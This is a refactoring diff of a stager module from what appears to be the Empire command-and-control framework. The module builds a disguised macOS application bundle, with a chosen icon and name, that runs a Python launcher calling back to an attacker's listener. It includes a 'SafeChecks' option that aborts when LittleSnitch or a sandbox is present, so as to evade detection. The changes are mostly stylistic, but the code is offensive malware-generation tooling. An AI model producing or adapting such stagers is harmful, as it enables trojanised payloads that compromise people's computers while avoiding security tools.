@@ -12,7 +12,7 @@ class Stager(object):
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates an Empire Application.'),
+            'Description': 'Generates an Empire Application.',
 
             'Comments': [
                 ''
@@ -23,47 +23,51 @@ class Stager(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to generate stager for.',
+                'Required': True,
+                'Value': ''
             },
-            'Language' : {
-                'Description'   :   'Language of the stager to generate.',
-                'Required'      :   True,
-                'Value'         :   'python'
+            'Language': {
+                'Description': 'Language of the stager to generate.',
+                'Required': True,
+                'Value': 'python',
+                'SuggestedValues': ['python'],
+                'Strict': True
             },
-            'AppIcon' : {
-                'Description'   :   'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'AppIcon': {
+                'Description': 'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.',
+                'Required': False,
+                'Value': ''
             },
-            'AppName' : {
-                'Description'   :   'Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'AppName': {
+                'Description': 'Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.',
+                'Required': False,
+                'Value': ''
             },
-            'OutFile' : {
-                'Description'   :   'Filename that should be used for the generated output.',
-                'Required'      :   True,
-                'Value'         :   'out.zip'
+            'OutFile': {
+                'Description': 'Filename that should be used for the generated output.',
+                'Required': True,
+                'Value': 'out.zip'
             },
-            'SafeChecks' : {
-                'Description'    :  'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
-                'Required'       :  True,
-                'Value'          :  'True',
-                'SuggestedValues':  ['True', 'False'],
-                'Strict'         :  True
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True',
+                'SuggestedValues': ['True', 'False'],
+                'Strict': True
             },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'Architecture' : {
-                'Description'   :   'Architecture to use. x86 or x64',
-                'Required'      :   True,
-                'Value'         :   'x64'
+            'Architecture': {
+                'Description': 'Architecture to use. x86 or x64',
+                'Required': True,
+                'Value': 'x64',
+                'SuggestedValues': ['x64', 'x86'],
+                'Strict': True
             }
         }
 
@@ -81,17 +85,17 @@ class Stager(object):
 
         # extract all of our options
         language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
-        savePath = self.options['OutFile']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        SafeChecks = self.options['SafeChecks']['Value']
+        listener_name = self.options['Listener']['Value']
+        save_path = self.options['OutFile']['Value']
+        user_agent = self.options['UserAgent']['Value']
+        safe_checks = self.options['SafeChecks']['Value']
         arch = self.options['Architecture']['Value']
-        icnsPath = self.options['AppIcon']['Value']
-        AppName = self.options['AppName']['Value']
-        
+        icns_path = self.options['AppIcon']['Value']
+        app_name = self.options['AppName']['Value']
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent, safeChecks=SafeChecks)
+        launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, userAgent=user_agent,
+                                                           safeChecks=safe_checks)
 
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
@@ -100,5 +104,6 @@ class Stager(object):
         else:
             disarm = False
             launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
-            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName, disarm=disarm)
-            return ApplicationZip
+            application_zip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher, Arch=arch, icon=icns_path,
+                                                                      AppName=app_name, disarm=disarm)
+            return application_zip
